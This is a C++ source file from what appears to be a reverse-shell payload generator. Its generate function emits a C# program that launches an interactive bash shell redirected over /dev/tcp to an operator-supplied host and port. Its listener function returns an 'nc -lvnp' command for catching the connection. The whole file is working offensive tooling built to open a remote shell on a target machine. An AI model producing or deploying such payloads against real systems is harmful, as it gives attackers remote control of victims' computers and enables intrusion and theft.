#include "C_Sharp_Bash_I_Payload.h"
#include "../../listeners/ListenerFactory.h"

#include <sstream>
#include <string>
std::string CSharpBashIPayload::name() const {
return "c_sharp_bash_i";
}

std::string CSharpBashIPayload::generate(const Options& opts) const {
    std::ostringstream ss;
    ss << "using System;\n"
       << "using System.Diagnostics;\n\n"
       << "namespace BackConnect {\n"
       << "     class ReverseBash {\n"
       << "          public static void Main(string[] args) {\n"
       << "               Process proc = new System.Diagnostics.Process();\n"
       << "               proc.StartInfo.FileName = \"" << opts.interpreter << "\";"
       << "               proc.StartInfo.Arguments = \"-c \\\"" << opts.interpreter << " -i >& /dev/tcp/" << opts.host << "/" << std::to_string(opts.port) << " 0>&1\\\"\n"
       << "               proc.StartInfo.UseShellExecute = false;\n"
       << "               proc.StartInfo.RedirectStandardOutput = true;\n"
       << "               proc.Start();\n\n"
       << "               while (!proc.StandardOutput.EndOfStream) {\n"
       << "                    Console.WriteLine(proc.StandardOutput.ReadLine());\n"
       << "               }\n"
       << "          }\n"
       << "     }\n"
       << "}\n";
    return ss.str();
}

std::string CSharpBashIPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}